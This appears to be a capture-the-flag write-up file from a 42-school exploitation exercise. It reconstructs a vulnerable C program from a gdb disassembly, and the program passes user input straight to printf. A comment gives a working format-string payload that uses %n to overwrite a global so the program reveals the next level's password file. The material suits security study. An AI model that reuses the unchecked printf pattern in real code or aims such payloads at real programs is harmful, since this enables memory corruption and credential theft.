/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level4.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/14 14:03:46 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/15 15:48:54 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

//(gdb) disas main
//Dump of assembler code for function main:
//   0x080484a7 <+0>:	push   %ebp
//   0x080484a8 <+1>:	mov    %esp,%ebp
//   0x080484aa <+3>:	and    $0xfffffff0,%esp
//
//   0x080484ad <+6>:	call   0x8048457 <n>
//
//   0x080484b2 <+11>:	leave  
//   0x080484b3 <+12>:	ret    
//End of assembler dump.
//(gdb) disas p
//Dump of assembler code for function p:
//   0x08048444 <+0>:	push   %ebp
//   0x08048445 <+1>:	mov    %esp,%ebp
//
//   0x08048447 <+3>:	sub    $0x18,%esp
//
//   0x0804844a <+6>:	mov    0x8(%ebp),%eax < get first param
//   0x0804844d <+9>:	mov    %eax,(%esp) < . str is 24 octets far from ebp, 24 + 8 = 32 from first p param, 32 + 16 = 48 from str buff -> 12 pop
//   0x08048450 <+12>:	call   0x8048340 <printf@plt>
//
//   0x08048455 <+17>:	leave  
//   0x08048456 <+18>:	ret    
//End of assembler dump.
//(gdb) disas n
//Dump of assembler code for function n:
//   0x08048457 <+0>:	push   %ebp
//   0x08048458 <+1>:	mov    %esp,%ebp
//
//   0x0804845a <+3>:	sub    $0x218,%esp
//
//   0x08048460 <+9>:	mov    0x8049804,%eax < stdin
//   0x08048465 <+14>:	mov    %eax,0x8(%esp) .
//   0x08048469 <+18>:	movl   $0x200,0x4(%esp) < 512
//   0x08048471 <+26>:	lea    -0x208(%ebp),%eax < str
//   0x08048477 <+32>:	mov    %eax,(%esp) .
//   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
//
//   0x0804847f <+40>:	lea    -0x208(%ebp),%eax < str
//   0x08048485 <+46>:	mov    %eax,(%esp) .
//   0x08048488 <+49>:	call   0x8048444 <p>
//
//   0x0804848d <+54>:	mov    0x8049810,%eax < m
//   0x08048492 <+59>:	cmp    $0x1025544,%eax < cmp 16930116 == m
//   0x08048497 <+64>:	jne    0x80484a5 <n+78>
//
//   0x08048499 <+66>:	movl   $0x8048590,(%esp) < "/bin/cat /home/user/level5/.pass"
//   0x080484a0 <+73>:	call   0x8048360 <system@plt>
//
//   0x080484a5 <+78>:	leave  
//   0x080484a6 <+79>:	ret    
//End of assembler dump.

#include <stdio.h>
#include <stdlib.h>

// m @ 0x08049810
// ruby -e 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > /tmp/exploit

unsigned int m;

void	p(char *str) {
	printf(str);
}

void	n(void) {
	char		str[520];

	fgets(str, 512, stdin);	
	p(str);

	if (m == 16930116) {
		system("/bin/cat /home/user/level5/.pass");
	}
}

int		main(void) {
	n();

	return (0);
}
